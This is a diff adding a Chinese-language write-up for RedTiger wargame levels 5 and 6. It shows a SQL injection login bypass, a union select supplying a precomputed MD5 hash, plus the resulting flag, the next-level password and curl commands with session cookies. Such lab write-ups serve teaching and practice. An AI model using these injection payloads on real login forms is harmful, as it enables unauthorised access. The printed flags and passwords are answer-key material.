@@ -818,6 +818,44 @@ print 'result = ', result
 curl "http://redtiger.labs.overthewire.org/level5.php" -H "Cookie: level2login=4_is_not_random; level3login=feed_your_cat_before_your_cat_feeds_you; level4login=there_is_no_bug"
 ```
 
+## level5
+
+> Target: Bypass the login
+> Disabled: substring , substr, ( , ), mid
+> Hints: its not a blind, the password is md5-crypted, watch the login errors
+
+不能进行盲注。那就先输入`admin`用户和随便一个密码，显示
+> Some things are disabled!!
+
+看来`admin`这个词给过滤掉了。
+
+然后测试 `username` 是否存在注入点，输入`'`。
+> Warning: mysql_num_rows() expects parameter 1 to be resource, boolean given in /var/www/html/hackit/level5.php on line 46
+> User not found!
+
+很好，然后熟练得测试出回显字段，得到2个回显字段。`' union select 1,2#`。这时显示的错误为 
+> Login failed!
+说明我们绕过了 `username` ，接下来对 `	password` 进行测试。
+
+题目说 `password` 经过了 md5 加密，而且还过滤了 `(` 与 `)` 两个字符。 因此将 `password` 值为1，并对字符串'1' 进行md5加密，MD5('1')='c4ca4238a0b923820dcc509a6f75849b'。
+测试到底是 select 的1位置用md5加密还是2位置用md5加密。
+```
+username= ' union select 1,'c4ca4238a0b923820dcc509a6f75849b'#
+password=1
+```
+可以得到结果
+> You can raise your wechall.net score with this flag: ca5c3c4f0bc85af1392aef35fc1d09b3
+> The password for the next level is: for_more_bugs_update_to_php7
+
+
+
+
+## level 6
+
+```
+curl 'http://redtiger.labs.overthewire.org/level6.php?user=1' -H 'Cookie: level5login=there_is_a_truck; level6login=for_more_bugs_update_to_php7'
+```
+
 ## 参考网站
 [1] [SQL 注入](https://ctf-wiki.github.io/ctf-wiki/web/sqli/)
 [2] [SQL注入教程——（三）简单的注入尝试](http://blog.csdn.net/helloc0de/article/details/76142478)
